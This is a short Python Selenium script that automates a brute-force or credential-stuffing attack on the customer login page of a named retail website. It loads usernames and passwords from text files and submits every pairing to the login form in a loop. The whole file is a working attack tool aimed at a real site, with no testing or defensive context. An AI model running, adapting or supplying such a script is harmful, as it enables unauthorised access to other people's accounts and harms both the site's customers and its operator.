import string, random, time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from ctypes import sizeof
ubicacionDriver = '/usr/local/bin/chromedriver'

def readUsuarios():
    usuarios = list()
    arc = open("user.txt")
    lineas = arc.readlines()
    i = 0    #driver.get('https://www.abcdin.cl/')
    for lineas in lineas:
        usuarios.append(lineas)
    return usuarios

def readPasswords():
    passwords = list()
    arc = open("pass.txt")
    lineas = arc.readlines()
    i = 0
    for lineas in lineas:
        passwords.append(lineas)
    return passwords


if __name__ == "__main__":
    options = webdriver.ChromeOptions()
    options.add_argument('--start-maximized')
    options.add_argument('--disable-extensions')

    driver = webdriver.Chrome(ubicacionDriver, chrome_options=options)
    correos=readUsuarios()
    contraseñas=readPasswords()
    driver.set_window_position(1000,0)
    driver.maximize_window()
    time.sleep(1)
    driver.get('https://www.abcdin.cl/customer/account/login/')
    time.sleep(5)
    for contraseña in contraseñas:
        for correo in correos: 
            
            email = driver.find_element(By.ID, "email")
            email.clear()
            email.send_keys(correo)
            time.sleep(1)
            passw = driver.find_element(By.ID,"pass")
            passw.clear()
            passw.send_keys(contraseña)
            time.sleep(1)
            driver.find_element(By.ID, "send2").click()
            time.sleep(2)
    driver.close()